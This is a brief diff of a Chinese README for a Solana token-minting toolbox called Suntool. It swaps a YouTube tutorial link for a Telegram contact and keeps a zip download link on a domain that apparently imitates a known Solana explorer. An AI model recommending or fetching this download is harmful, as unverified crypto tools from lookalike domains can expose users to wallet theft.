@@ -10,7 +10,7 @@ Suntool提供更易用、无需编程的全可视化工具箱，为Solana用户�
 
 Mint工具下载：https://www.solscan.men/solanamint.zip
 
-锁币发行视频教程：https://youtu.be/Hdx7dLQDldE 
+锁币发行视频教程：https://t.me/jiaofukeyi
 
 ![image](/image/home.jpg)
 
